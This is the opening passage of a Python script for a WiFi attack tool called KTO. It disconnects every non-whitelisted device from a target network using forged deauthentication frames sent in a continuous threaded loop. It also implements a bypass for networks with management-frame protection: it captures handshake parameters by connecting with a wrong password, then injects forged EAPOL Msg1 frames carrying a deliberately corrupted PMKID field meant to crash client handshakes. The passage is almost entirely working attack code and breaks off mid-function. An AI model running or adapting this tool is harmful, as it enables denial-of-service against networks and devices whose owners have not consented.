#!/usr/bin/env python3
"""
KTO — Kick Them Out  v2.1.6
WiFi deauthentication tool with experimental PMF bypass (WPA2+PMF only).

Kicks all connected devices from a target network, except whitelisted ones.
Supports threaded aggressive mode: scan and deauth run in parallel so clients
never get a breathing window to reconnect.

Requirements : scapy, aircrack-ng suite (airodump-ng, aireplay-ng, airmon-ng), wpa_supplicant
Usage        : sudo python3 kto.py -i wlan0 -t "MyNetwork" [options]

"""

VERSION = "2.1.6"   # keep this in sync with github releases

import argparse
import os
import re
import struct
import sys
import subprocess
import time
import signal
import shutil
import tempfile
import threading
from pathlib import Path
from collections import defaultdict
from datetime import datetime

# ── Scapy ──────────────────────────────────────────────────────────────────
try:
    from scapy.all import sendp, conf, EAPOL, Raw, sniff, MANUFDB
    from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
except ImportError:
    print("[-] scapy not found.  pip install scapy")
    sys.exit(1)


# ── Update check ─────────────────────────────────────────────────────────────

def _check_update():
    # runs in background so startup isn't slowed down
    try:
        import urllib.request, json
        url = "https://api.github.com/repos/Ymsniper/KTO/releases/latest"
        with urllib.request.urlopen(url, timeout=4) as r:
            latest = json.loads(r.read())["tag_name"].lstrip("v")
        if latest != VERSION:
            warn(f"Update available: v{latest}  →  github.com/Ymsniper/KTO")
    except Exception:
        pass  # offline, rate limited, no releases yet


# ── Terminal colors ─────────────────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"

_log_lock = threading.Lock()

def _ts() -> str:
    return datetime.now().strftime("%H:%M:%S")

def info(msg):
    with _log_lock:
        print(f"{C.DIM}{_ts()}{C.RESET}  {C.CYAN}[*]{C.RESET} {msg}")

def good(msg):
    with _log_lock:
        print(f"{C.DIM}{_ts()}{C.RESET}  {C.GREEN}[+]{C.RESET} {msg}")

def warn(msg):
    with _log_lock:
        print(f"{C.DIM}{_ts()}{C.RESET}  {C.YELLOW}[~]{C.RESET} {msg}")

def bad(msg):
    with _log_lock:
        print(f"{C.DIM}{_ts()}{C.RESET}  {C.RED}[-]{C.RESET} {msg}")

def kick(msg):
    with _log_lock:
        print(f"{C.DIM}{_ts()}{C.RESET}  {C.RED}{C.BOLD}[!]{C.RESET} {msg}")


manufdb = MANUFDB
MAC_RE = re.compile(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')


def oui_vendor(mac: str) -> str:
    try:
        if int(mac.replace(":", "")[:2], 16) & 0x02:
            return ""
    except Exception:
        return ""
    try:
        result = manufdb.lookup(mac)
        if result is None:
            return ""
        name = result[0] or ""
        return "" if name.upper() == mac.upper() else name
    except Exception:
        return ""

def vendor_tag(mac: str) -> str:
    v = oui_vendor(mac)
    return f" {C.DIM}({v}){C.RESET}" if v else ""

def normalize_mac(mac: str) -> str:
    return mac.upper().strip()

def validate_mac(mac: str) -> bool:
    return bool(MAC_RE.match(mac))


# ── System helpers ──────────────────────────────────────────────────────────

def check_root():
    if os.geteuid() != 0:
        bad("Must be run as root. Use sudo.")
        sys.exit(1)

def check_dependency(tool: str):
    if not shutil.which(tool):
        bad(f"Required tool not found: {tool}")
        bad("  sudo apt install aircrack-ng")
        sys.exit(1)

def set_channel(interface: str, channel: int):
    try:
        subprocess.run(
            ["iw", interface, "channel", str(channel)],
            check=True, capture_output=True,
        )
        good(f"Channel locked to {channel}")
    except subprocess.CalledProcessError as e:
        warn(f"Could not lock channel {channel}: {e.stderr.decode().strip()}")


def _list_monitor_ifaces() -> set:
    try:
        out = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=4).stdout
        ifaces = set()
        current = None
        for line in out.splitlines():
            line = line.strip()
            m = re.match(r'Interface\s+(\S+)', line)
            if m:
                current = m.group(1)
            if current and re.match(r'type\s+monitor', line, re.I):
                ifaces.add(current)
        return ifaces
    except Exception:
        return set()


def enable_monitor_mode(iface: str) -> str:
    info(f"Enabling monitor mode on {iface}…")
    before = _list_monitor_ifaces()
    subprocess.run(["airmon-ng", "check", "kill"], capture_output=True)
    subprocess.run(["airmon-ng", "start", iface], capture_output=True, text=True)
    time.sleep(0.5)
    after = _list_monitor_ifaces()
    new_ifaces = after - before
    if new_ifaces:
        mon = sorted(new_ifaces)[0]
        good(f"Monitor interface: {mon}")
        return mon
    # some drivers switch the same interface to monitor type instead of creating a new one
    if iface in after:
        good(f"Monitor interface: {iface}")
        return iface
    mon = iface + "mon"
    warn(f"Could not detect monitor interface — assuming {mon}")
    return mon

def disable_monitor_mode(mon_iface: str):
    info(f"Restoring {mon_iface} to managed mode…")
    # Try to stop monitor mode – don't crash on any error
    try:
        subprocess.run(["airmon-ng", "stop", mon_iface],
                       capture_output=True, check=False)
    except Exception as e:
        warn(f"airmon-ng stop failed: {e}")

    # Restart network manager using the most common init commands.
    # We try several and ignore all failures, so the cleanup never crashes.
    for cmd in (
        ["service", "NetworkManager", "start"],
        ["systemctl", "restart", "NetworkManager"],
        ["service", "network-manager", "start"],
    ):
        try:
            subprocess.run(cmd, capture_output=True, check=False)
            break  # exit loop on first success
        except FileNotFoundError:
            continue
        except Exception:
            continue


def get_iface_mac(iface: str) -> str | None:
    """Read the permanent MAC address of a network interface."""
    try:
        path = f"/sys/class/net/{iface}/address"
        with open(path, "r") as f:
            return f.read().strip().upper()
    except Exception:
        return None


# ── Core ────────────────────────────────────────────────────────────────────

class KTO:
    def __init__(
        self,
        interface: str,
        ssid: str,
        whitelist: set[str],
        channel: int | None,
        deauth_count: int,
        interval: float,
        scan_duration: float,
        deauth_delay: float,        # per-client delay in aggressive mode
        broadcast: bool,
        use_aireplay: bool,
        aggressive: bool,
        scan_only: bool,
        auto_monitor: bool,
        auto_bssid: bool,           # auto-pick strongest when SSID has multiple APs
        reason: int,                # 802.11 deauth reason code
        log_file: str | None,       # path to save kick log, None = disabled
        live_table: bool,           # live client table (clears screen), off by default
        no_bypass: bool = False,    # disable experimental PMF bypass
    ):
        self.interface     = interface
        self.ssid          = ssid
        self.whitelist     = whitelist
        self.channel       = channel
        self.deauth_count  = deauth_count
        self.interval      = interval
        self.scan_duration = scan_duration
        self.deauth_delay  = deauth_delay
        self.broadcast     = broadcast
        self.use_aireplay  = use_aireplay
        self.aggressive    = aggressive
        self.scan_only     = scan_only
        self.auto_monitor  = auto_monitor
        self.auto_bssid    = auto_bssid
        self.reason        = reason
        self.live_table    = live_table
        self.no_bypass     = no_bypass

        # open log file if given — append so re-runs don't overwrite old sessions
        self._log_fh = None
        if log_file:
            self._log_fh = open(log_file, "a")
            self._log_fh.write(f"\n# session started {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        # PMF bypass state (WPA2+PMF only)
        self.pmf_bypass       = False
        self.passive_bypass   = False
        self.ap_key_info      = None     # Key Info from AP's actual Msg1
        self.ap_replay_ctr    = 0
        self.is_wpa3          = False    # SAE AKM present → skip bypass
        self.has_transition   = False

        self.target_bssid: str | None   = None
        self.target_channel: int | None = channel
        self._mon_created: bool         = False

        # Thread-shared state
        self._clients: set[str]      = set()
        self._clients_lock           = threading.Lock()
        self._seen: set[str]         = set()

        # stats has its own lock so the signal handler
        # can read it safely while _deauth_loop is writing it
        self._stats: dict[str, int]  = defaultdict(int)
        self._stats_lock             = threading.Lock()

        self._running                = threading.Event()
        self._running.set()

        self._tmpdir = tempfile.mkdtemp(prefix="kto_")
        conf.iface   = interface
        signal.signal(signal.SIGINT, self._graceful_exit)

    # ── Cleanup ─────────────────────────────────────────────────────────────

    def _cleanup(self):
        # Always remove temp files – ignore any errors
        try:
            shutil.rmtree(self._tmpdir, ignore_errors=True)
        except Exception:
            pass

        # Kill any wpa_supplicant we may have started during PMF bypass
        try:
            subprocess.run(["pkill", "-9", "wpa_supplicant"], capture_output=True, timeout=3)
        except Exception:
            pass

        # Restore interface only if we created a monitor interface
        if self._mon_created and self.auto_monitor:
            try:
                disable_monitor_mode(self.interface)
            except Exception:
                pass

        if self._log_fh:
            try:
                self._log_fh.write(f"# session ended   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                self._log_fh.close()
            except Exception:
                pass

    def _graceful_exit(self, sig, frame):
        try:
            print()
            self._running.clear()
            info("Stopping KTO.")
            # (cont.): read stats under lock
            with self._stats_lock:
                stats_copy = dict(self._stats)
            if stats_copy:
                info("Session summary:")
                # show total bursts per client in a tidy table
                header = f"    {'MAC':<20} {'Vendor':<12} {'Bursts':>6}"
                print(f"{C.DIM}{header}{C.RESET}")
                print(f"{C.DIM}    {'-'*42}{C.RESET}")
                for mac, count in sorted(stats_copy.items(), key=lambda x: -x[1]):
                    vendor = oui_vendor(mac) or "—"
                    print(f"    {C.BOLD}{mac:<20}{C.RESET} {C.DIM}{vendor:<12}{C.RESET} {C.YELLOW}{count:>6}{C.RESET}")
        finally:
            # Always run cleanup, even if the summary printing fails
            self._cleanup()
            sys.exit(0)

    # ── airodump-ng wrapper ──────────────────────────────────────────────────

    def _run_airodump(self, extra_args: list[str], duration: float) -> Path:
        out_base = Path(self._tmpdir) / "scan"
        for f in Path(self._tmpdir).glob("scan*"):
            f.unlink(missing_ok=True)

        proc = subprocess.Popen(
            ["airodump-ng", "--output-format", "csv", "-w", str(out_base)]
            + extra_args + [self.interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        deadline = time.monotonic() + duration
        # (supports non-integer scan_duration, and bails early on stop)
        while time.monotonic() < deadline and self._running.is_set():
            time.sleep(0.25)
        proc.terminate()
        proc.wait()
        return out_base

    # ── RSN / PMF detection via beacon sniff ─────────────────────────────────

    def _beacon_pmf_check(self, bssid: str) -> bool:
        # airodump CSV auth field only shows SAE/OWE — misses WPA2-PSK+PMF.
        # this reads the RSN IE caps bits directly from a beacon frame so we
        # catch PMF regardless of auth type.
        # Also detects WPA3/SAE so we can disable bypass for those networks.
        from scapy.all import Dot11Beacon, Dot11Elt, sniff
        target = bssid.upper()
        found  = {"pmf": False, "is_wpa3": False, "transition": False}

        def _check(pkt):
            if not pkt.haslayer(Dot11Beacon):
                return
            if not pkt[Dot11].addr2 or pkt[Dot11].addr2.upper() != target:
                return
            elt = pkt[Dot11Elt]
            while elt:
                if elt.ID == 48 and elt.len >= 4:   # RSN IE
                    try:
                        b      = bytes(elt.info)
                        offset = 2 + 4              # skip version + group cipher
                        pc     = int.from_bytes(b[offset:offset+2], "little")
                        offset += 2 + pc * 4        # skip pairwise list
                        ac     = int.from_bytes(b[offset:offset+2], "little")
                        offset += 2  # skip AKM count; iterate suites manually
                        akm_types: set[int] = set()
                        for _ in range(ac):
                            if offset + 4 <= len(b):
                                oui   = b[offset:offset+3]
                                suite = b[offset+3]
                                if oui == bytes([0x00, 0x0f, 0xac]):
                                    akm_types.add(suite)
                            offset += 4
                        has_sae = bool(akm_types & {8, 9})      # SAE / FT-SAE
                        has_psk = bool(akm_types & {2, 4, 6})   # PSK / FT-PSK
                        found["is_wpa3"]    = has_sae
                        found["transition"] = has_sae and has_psk
                        if offset + 2 <= len(b):
                            caps = int.from_bytes(b[offset:offset+2], "little")
                            if caps & 0x00C0:       # bit6=MFPC, bit7=MFPR
                                found["pmf"] = True
                    except Exception:
                        pass
                    return
                try:
                    elt = elt.payload
                    if not isinstance(elt, Dot11Elt):
                        break
                except Exception:
                    break

        try:
            time.sleep(0.3)   # let driver settle on the locked channel first
            sniff(
                iface=self.interface,
                lfilter=lambda p: p.haslayer(Dot11Beacon),
                prn=_check,
                stop_filter=lambda p: found["pmf"] or found["is_wpa3"],
                timeout=6,
                store=False,
            )
        except Exception:
            pass

        self.is_wpa3       = found["is_wpa3"]
        self.has_transition = found["transition"]
        return found["pmf"]

    # ── Target discovery ─────────────────────────────────────────────────────

    # parse the AP section of an airodump CSV and return all matching rows
    # as a list of dicts so find_target can handle multi-AP SSIDs.
    def _parse_ap_csv(self, csv_file: Path) -> list[dict]:
        results = []
        if not csv_file.exists():
            return results
        with csv_file.open(errors="replace") as f:
            for line in f:
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 14:
                    continue
                bssid = parts[0]
                chan  = parts[3]
                # column 8 = Privacy (e.g. "WPA2"), column 14 = ESSID
                # airodump CSV: BSSID, First time seen, Last time seen, channel,
                #   Speed, Privacy, Cipher, Authentication, Power, # beacons,
                #   # IV, LAN IP, ID-length, ESSID, Key
                privacy = parts[5] if len(parts) > 5 else ""
                power   = parts[8] if len(parts) > 8 else "-100"
                essid   = parts[13] if len(parts) > 13 else ""
                # detect MFPR/MFPC flags in the Authentication column
                auth    = parts[7] if len(parts) > 7 else ""
                pmf     = "MGT" in auth or "OWE" in auth or "SAE" in auth
                if ":" in bssid and essid == self.ssid:
                    try:
                        pwr = int(power)
                    except ValueError:
                        pwr = -100
                    try:
                        ch = int(chan)
                    except ValueError:
                        ch = None
                    results.append({
                        "bssid":   normalize_mac(bssid),
                        "channel": ch,
                        "power":   pwr,
                        "privacy": privacy,
                        "pmf":     pmf,
                    })
        return results

    def find_target(self) -> bool:
        info(f"Scanning for SSID: {C.BOLD}{self.ssid}{C.RESET}  ({self.scan_duration:.0f} s)…")
        out_base = self._run_airodump(
            ["--essid", self.ssid],
            duration=self.scan_duration,
        )
        csv_file = Path(str(out_base) + "-01.csv")

        if not csv_file.exists():
            bad("airodump-ng produced no output. Is the interface in monitor mode?")
            return False

        matches = self._parse_ap_csv(csv_file)

        if not matches:
            bad(f"SSID '{self.ssid}' not found in scan window.")
            return False

        # multi-AP handling
        if len(matches) == 1 or self.auto_bssid:
            # auto-pick: strongest signal (least negative power value)
            chosen = max(matches, key=lambda r: r["power"])
            if len(matches) > 1:
                warn(
                    f"{len(matches)} APs share SSID '{self.ssid}'. "
                    f"Auto-selecting strongest signal (use --bssid to override)."
                )
        else:
            print()
            info(f"Multiple APs found for SSID '{self.ssid}':")
            for i, r in enumerate(matches, 1):
                pmf_tag = f"  {C.RED}[PMF]{C.RESET}" if r["pmf"] else ""
                print(
                    f"  [{i}] {C.BOLD}{r['bssid']}{C.RESET}"
                    f"  ch {r['channel']}"
                    f"  pwr {r['power']} dBm"
                    f"  {r['privacy']}"
                    f"{pmf_tag}"
                )
            print()
            while True:
                try:
                    idx = int(input(f"  Select AP [1-{len(matches)}]: ")) - 1
                    if 0 <= idx < len(matches):
                        chosen = matches[idx]
                        break
                except (ValueError, KeyboardInterrupt):
                    pass
                warn("Invalid selection, try again.")

        self.target_bssid   = chosen["bssid"]
        if not self.target_channel:
            self.target_channel = chosen["channel"]

        # lock channel before beacon sniff so we actually hear the AP
        if self.target_channel:
            try:
                subprocess.run(
                    ["iw", "dev", self.interface, "set", "channel", str(self.target_channel)],
                    capture_output=True, timeout=5,
                )
            except Exception:
                pass

        # CSV auth field only catches SAE/OWE — misses WPA2-PSK+PMF.
        # run a beacon sniff to read RSN IE caps bits directly if CSV missed it.
        if not chosen.get("pmf"):
            info("Checking RSN IE for PMF (802.11w)…")
            chosen["pmf"] = self._beacon_pmf_check(chosen["bssid"])

        # Fallback: if CSV privacy says WPA3/SAE, force WPA3 detection
        # so we never trigger the bypass on a WPA3-capable AP.
        privacy_upper = chosen.get("privacy", "").upper()
        if "WPA3" in privacy_upper or "SAE" in privacy_upper:
            self.is_wpa3 = True
            self.has_transition = "WPA2" in privacy_upper  # best guess

        wpa3_tag = ""
        if self.is_wpa3:
            wpa3_tag = (f"  {C.CYAN}[WPA3-Transition]{C.RESET}" if self.has_transition
                        else f"  {C.CYAN}[WPA3-SAE]{C.RESET}")

        good(
            f"Target  {C.BOLD}{self.ssid}{C.RESET}"
            f"  BSSID {self.target_bssid}"
            f"  ch {self.target_channel}"
            f"  {chosen['privacy']}"
            + wpa3_tag
            + (f"  {C.RED}[PMF]{C.RESET}" if chosen["pmf"] else "")
        )

        # PMF warning and bypass decision
        if chosen["pmf"]:
            warn(
                f"{C.YELLOW}{C.BOLD}PMF/MFP detected on this AP.{C.RESET}"
                f" 802.11w-capable clients will ignore unprotected deauth frames."
            )
            if self.no_bypass:
                warn("--no-bypass set: treating PMF network as standard WiFi. PMF clients will drop unsigned deauths.")
            elif self.is_wpa3:
                # WPA3/SAE – bypass not supported
                warn(
                    "WPA3 (SAE) detected — PMF bypass only supports WPA2+PMF. "
                    "Falling back to standard deauth."
                )
            else:
                # WPA2+PMF – enable wrong‑password extraction
                info("WPA2+PMF detected. Enabling experimental wrong‑password EAPOL extraction…")
                self.pmf_bypass = True

        return True

    # ── Client discovery ─────────────────────────────────────────────────────

    def _scan_clients_once(self) -> set[str]:
        # (cont.): uses self.scan_duration instead of hardcoded 8
        out_base = self._run_airodump(
            ["--bssid", self.target_bssid, "-c", str(self.target_channel or 6)],
            duration=self.scan_duration,
        )
        csv_file = Path(str(out_base) + "-01.csv")
        found: set[str] = set()

        if not csv_file.exists():
            return found

        in_clients = False
        with csv_file.open(errors="replace") as f:
            for line in f:
                if "Station MAC" in line:
                    in_clients = True
                    continue
                if not in_clients:
                    continue
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 6:
                    continue
                mac   = normalize_mac(parts[0])
                assoc = normalize_mac(parts[5]) if len(parts) > 5 else ""
                if (
                    validate_mac(mac)
                    and mac != self.target_bssid
                    and assoc == self.target_bssid
                ):
                    found.add(mac)
        return found

    # ── PMF bypass: wrong‑password EAPOL extraction (WPA2+PMF only) ────────

    def _perform_wrong_pass_eapol_extract(self) -> bool:
        """
        Capture EAPOL Msg1 from the AP without knowing the real password.
        Works on WPA2+PMF by connecting with a random PSK.
        After extraction, monitor mode is restored.
        """
        import random, string

        fake_pw = "".join(random.choices(string.ascii_letters + string.digits, k=12))
        info("Wrong‑password EAPOL extraction: triggering handshake with fake PSK…")

        mon_iface = self.interface

        # Airgeddon‑style mode switch: operate directly on the monitor iface
        info(f"Switching {mon_iface} to managed…")
        subprocess.run(["rfkill", "unblock", "wifi"], capture_output=True, timeout=3)
        subprocess.run(["rfkill", "unblock", "all"],  capture_output=True, timeout=3)
        subprocess.run(["ip", "link", "set", mon_iface, "down"], capture_output=True, timeout=4)
        time.sleep(0.3)
        r = subprocess.run(["iw", mon_iface, "set", "type", "managed"],
                           capture_output=True, text=True, timeout=4)
        if r.returncode != 0:
            warn("iw set type managed failed — trying iwconfig fallback…")
            subprocess.run(["iwconfig", mon_iface, "mode", "managed"], capture_output=True, timeout=4)
        subprocess.run(["ip", "link", "set", mon_iface, "up"], capture_output=True, timeout=4)
        time.sleep(0.8)

        chk = subprocess.run(["iw", "dev", mon_iface, "info"],
                              capture_output=True, text=True, timeout=3).stdout
        if "type managed" not in chk:
            bad("Managed mode switch failed — aborting PMF bypass.")
            self._restore_monitor_after_pmf()
            return False
        good(f"{mon_iface} is managed ✓")

        # Kill any stale wpa_supplicant
        subprocess.run(["pkill", "-9", "wpa_supplicant"], capture_output=True, timeout=3)
        subprocess.run(["rm", "-f", f"/var/run/wpa_supplicant/{mon_iface}"], capture_output=True, timeout=2)
        time.sleep(0.3)

        # wpa_supplicant config (PSK + optional PMF)
        wpa_conf_content = (
            "ctrl_interface=/var/run/wpa_supplicant\n"
            "network={\n"
            f'    ssid="{self.ssid}"\n'
            f'    psk="{fake_pw}"\n'
            "    key_mgmt=WPA-PSK\n"
            "    proto=RSN WPA\n"
            "    pairwise=CCMP TKIP\n"
            "    group=CCMP TKIP\n"
            "    ieee80211w=1\n"
            "}\n"
        )

        wpa_conf_path = None
        wpas_proc     = None
        success       = False

        try:
            with tempfile.NamedTemporaryFile(mode="w", suffix=".conf",
                                            delete=False, prefix="kto_wp_") as tf:
                tf.write(wpa_conf_content)
                wpa_conf_path = tf.name

            for attempt in range(1, 4):   # up to 3 tries
                info(f"Wrong‑pass EAPOL: attempt {attempt}/3…")
                wpas_log = tempfile.mktemp(prefix="kto_wp_", suffix=".log")
                wpas_proc = subprocess.Popen(
                    ["wpa_supplicant", "-i", mon_iface, "-c", wpa_conf_path,
                     "-f", wpas_log, "-dd"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                )

                # Wait for association (up to 20 s)
                associated = False
                info("Waiting for association (up to 20 s)…")
                for tick in range(40):
                    time.sleep(0.5)
                    try:
                        lnk = subprocess.run(
                            ["iw", "dev", mon_iface, "link"],
                            capture_output=True, text=True, timeout=2,
                        ).stdout
                        if self.target_bssid.replace(":", "").lower() in lnk.replace(":", "").lower():
                            associated = True
                            break
                    except Exception:
                        pass
                    if tick % 8 == 7:
                        info(f"Still waiting… ({(tick+1)//2} s)")

                if associated:
                    good("Associated ✓ — waiting for AP Msg1…")
                    deadline = time.monotonic() + 8
                    while time.monotonic() < deadline and self.ap_key_info is None:
                        time.sleep(0.4)
                        self._parse_ap_handshake_params(wpas_log)
                else:
                    warn("Association timed out — scanning log anyway…")
                    self._parse_ap_handshake_params(wpas_log)

                if self.ap_key_info is not None:
                    good(f"EAPOL Msg1 captured! Key Info=0x{self.ap_key_info:04x}, Replay CTR={self.ap_replay_ctr}")
                    success = True
                    break

                warn(f"Attempt {attempt} failed — Msg1 not found.")
                if wpas_proc:
                    try:   wpas_proc.terminate(); wpas_proc.wait(timeout=3)
                    except Exception: wpas_proc.kill()
                    wpas_proc = None
                subprocess.run(["pkill", "-9", "wpa_supplicant"], capture_output=True, timeout=2)
                time.sleep(1.0)

        except Exception as e:
            bad(f"Wrong‑pass EAPOL: exception: {e}")
        finally:
            if wpas_proc:
                try:   wpas_proc.terminate(); wpas_proc.wait(timeout=3)
                except Exception: wpas_proc.kill()
            subprocess.run(["pkill", "-9", "wpa_supplicant"], capture_output=True, timeout=2)
            if wpa_conf_path:
                try:   os.unlink(wpa_conf_path)
                except Exception: pass

        self._restore_monitor_after_pmf()
        return success

    def _parse_ap_handshake_params(self, log_path: str):
        """
        Read Key Info and replay counter from the AP's Msg1 in the
        wpa_supplicant log.  These are used to build fake EAPOL Msg1
        frames — nothing is hardcoded, we use what the real AP sent.
        """
        try:
            lines = open(log_path, errors="replace").readlines()
        except Exception:
            return

        for ln in lines:
            if "RX EAPOL-Key" not in ln or "hexdump" not in ln:
                continue
            m = re.search(r"hexdump\(len=\d+\):\s*((?:[0-9a-f]{2}\s*)+)", ln, re.I)
            if not m:
                continue
            try:
                raw = bytes.fromhex(m.group(1).replace(" ", ""))
            except ValueError:
                continue
            if len(raw) < 17:
                continue

            # raw[0:4] = EAPOL version, type, length (big-endian)
            # raw[4]   = Key Descriptor Type
            # raw[5:7] = Key Info
            # raw[7:9] = Key Length
            # raw[9:17]= Replay Counter
            key_info       = struct.unpack(">H", raw[5:7])[0]
            replay_counter = struct.unpack(">Q", raw[9:17])[0]

            # Msg1 from AP: KeyACK=1 (bit7), KeyMIC=0 (bit8)
            key_ack = (key_info >> 7) & 1
            key_mic = (key_info >> 8) & 1
            if key_ack and not key_mic:
                self.ap_key_info   = key_info
                self.ap_replay_ctr = replay_counter
                return   # first Msg1 is enough

    def _build_fake_msg1(self, client: str):
        """
        Build a fake 4-Way Handshake Msg1 targeting a specific client.
        EAPOL frames are DATA frames, not protected by PMF.
        A corrupted PMKID KDE triggers a parsing error in wpa_supplicant.
        """
        try:
            from scapy.layers.l2 import LLC, SNAP
        except ImportError:
            from scapy.all import LLC, SNAP

        key_info   = self.ap_key_info if self.ap_key_info is not None else 0x008a
        replay_ctr = self.ap_replay_ctr + 0x100
        anonce     = os.urandom(32)

        body  = struct.pack(">B",  2)           # Key Descriptor Type: IEEE 802.11
        body += struct.pack(">H",  key_info)    # Key Info (from AP's actual Msg1)
        body += struct.pack(">H",  16)          # Key Length (AES-128 = 16)
        body += struct.pack(">Q",  replay_ctr)  # Replay Counter (ahead of AP's last)
        body += anonce                           # ANonce (random 32 bytes)
        body += b"\x00" * 16                   # Key IV
        body += b"\x00" * 8                    # Key RSC
        body += b"\x00" * 8                    # Reserved
        body += b"\x00" * 16                   # Key MIC (zero for Msg1)

        # PMKID KDE: tag=0xDD, length=0xFF (CORRUPTED, should be 0x14).
        key_data  = bytes([0xdd, 0xff, 0x00, 0x0f, 0xac, 0x04]) + b"\x00" * 16
        body     += struct.pack(">H", len(key_data)) + key_data

        eapol = bytes([0x02, 0x03]) + struct.pack(">H", len(body)) + body

        pkt = (
            RadioTap() /
            Dot11(
                type=2, subtype=0,
                FCfield=0x02,
                addr1=client,
                addr2=self.target_bssid,
                addr3=self.target_bssid,
            ) /
            LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
            SNAP(OUI=0x0, code=0x888e) /
            Raw(load=eapol)
        )
        return pkt

    def _restore_monitor_after_pmf(self):
        """Restore monitor mode — same airgeddon-style direct type flip."""
        mon_iface = self.interface
        try:
            info(f"Restoring {mon_iface} to monitor mode…")
            subprocess.run(["ip",  "link", "set", mon_iface, "down"], capture_output=True, timeout=4)
            time.sleep(0.2)
            r = subprocess.run(["iw", mon_iface, "set", "monitor", "control"],
                               capture_output=True, text=True, timeout=4)
            if r.returncode != 0:
                subprocess.run(["iw", mon_iface, "set", "type", "monitor"],
                               capture_output=True, timeout=4)
            subprocess.run(["ip", "link", "set", mon_iface, "up"], capture_output=True, timeout=4)
            time.sleep(0.4)
            chk = subprocess.run(["iw", "dev", mon_iface, "info"],
                                  capture_output=True, text=True, timeout=3).stdout
            if "type monitor" in chk:
                conf.iface = mon_iface
                good(f"{mon_iface} restored to monitor ✓")
            else:
                warn(f"Monitor restore uncertain — check {mon_iface} manually")
        except Exception as e:
            bad(f"Monitor restore failed: {e}")

    def _sniff_eapol_passively(self):
        """
        Passive mode: sniff EAPOL Msg1 from the AP without connecting.
        Waits for a natural reconnect; sets self.ap_key_info when armed.
        """
        if not self.target_bssid:
            return

        bssid_target = self.target_bssid.upper()
        info(f"Passive EAPOL sniff: listening for Msg1 from {bssid_target} — waiting for a natural reconnect…")

        def _handle(pkt):
            if not self._running.is_set():
                return True
            if not pkt.haslayer(Dot11) or not pkt.haslayer(EAPOL):
                return False
            src = pkt[Dot11].addr2
            if not src or src.upper() != bssid_target:
                return False
            raw = bytes(pkt[EAPOL])
            if len(raw) < 17 or raw[1] != 3:
                return False
            key_body = raw[4:]
            if len(key_body) < 13:
                return False
            try:
                key_info   = struct.unpack(">H", key_body[1:3])[0]
                replay_ctr = struct.unpack(">Q", key_body[5:13])[0]
            except struct.error:
                return False
            if not ((key_info >> 7) & 1) or ((key_info >> 8) & 1):
                return False
            self.ap_key_info   = key_info
            self.ap_replay_ctr = replay_ctr
            dst = pkt[Dot11].addr1 or "??"
            good(f"Passive EAPOL: Msg1 captured  AP → {dst}")
            good(f"  Key Info = 0x{key_info:04x}   Replay CTR = {replay_ctr}")
            good("  Armed — fake Msg1 will now fire on every discovered client.")
            return True

        while self._running.is_set() and self.ap_key_info is None:
            try:
                sniff(
                    iface=self.interface,
                    lfilter=lambda p: p.haslayer(EAPOL),
                    stop_filter=_handle,
                    timeout=4,
                    store=False,
                )
            except Exception as e:
                if self._running.is_set():
                    warn(f"Passive EAPOL sniff error: {e}")
                break

    # ── Packet construction ──────────────────────────────────────────────────

    def _build_deauth(self, dst: str, src: str):
        """
        Proper 802.11 management frame.
          addr1 = DA  (receiver)
          addr2 = SA  (transmitter)
          addr3 = BSSID  ← always the AP MAC, regardless of direction
        """
        return (
            RadioTap()
            / Dot11(
                type=0, subtype=12,
                addr1=dst,
                addr2=src,
                addr3=self.target_bssid,
            )
            # configurable reason code via self.reason
            / Dot11Deauth(reason=self.reason)
        )

    def _deauth_scapy(self, client: str):
        bssid = self.target_bssid
        kw    = dict(iface=self.interface, verbose=False)

        if self.ap_key_info is not None:
            # PMF bypass: send fake EAPOL Msg1 instead of deauth frames
            try:
                msg1 = self._build_fake_msg1(client)
                if msg1:
                    sendp(msg1, count=self.deauth_count, inter=0.05, **kw)
            except Exception as e:
                warn(f"  PMF bypass (fake Msg1) error: {e}")
        else:
            # Normal deauth (AP → Client, Client → AP)
            sendp(self._build_deauth(dst=client, src=bssid),
                  count=self.deauth_count, inter=0.05, **kw)
            sendp(self._build_deauth(dst=bssid,  src=client),
                  count=self.deauth_count, inter=0.05, **kw)

            if self.broadcast:
                sendp(self._build_deauth(dst="ff:ff:ff:ff:ff:ff", src=bssid),
                      count=self.deauth_count, inter=0.05, **kw)

    def _deauth_aireplay(self, client: str):
        if self.ap_key_info is not None:
            self._deauth_scapy(client)   # aireplay can't send fake Msg1
        else:
            subprocess.run(
                ["aireplay-ng", "--deauth", str(self.deauth_count),
                 "-a", self.target_bssid, "-c", client, self.interface],
                capture_output=True,
            )

    def _deauth(self, client: str):
        # Passive mode: stay silent until EAPOL sniff arms ap_key_info.
        if self.passive_bypass and self.ap_key_info is None:
            return
        try:
            if self.use_aireplay and self.ap_key_info is None:
                self._deauth_aireplay(client)
            else:
                self._deauth_scapy(client)
            # (cont.): increment stats under lock
            with self._stats_lock:
                self._stats[client] += 1
                burst_n = self._stats[client]
            kick(
                f"Kicked {C.BOLD}{client}{C.RESET}{vendor_tag(client)}"
                f"  (burst #{burst_n})"
            )
            # write to log file if --log was given
            if self._log_fh:
                vendor = oui_vendor(client) or "unknown"
                self._log_fh.write(
                    f"{datetime.now().strftime('%H:%M:%S')}  {client}  {vendor:<14}  burst #{burst_n}\n"
                )
                self._log_fh.flush()
        except Exception as e:
            bad(f"Deauth error ({client}): {e}")

    # ── Scan thread ──────────────────────────────────────────────────────────

    def _scan_loop(self):
        sweep = 0
        while self._running.is_set():
            sweep += 1
            info(f"Sweep #{sweep}  —  scanning…")
            found = self._scan_clients_once()

            # bail early if stopped during the scan window
            if not self._running.is_set():
                break

            with self._clients_lock:
                new_ones = found - self._seen
                gone     = self._clients - found
                self._clients = found

            for mac in new_ones:
                self._seen.add(mac)
                tag = vendor_tag(mac)
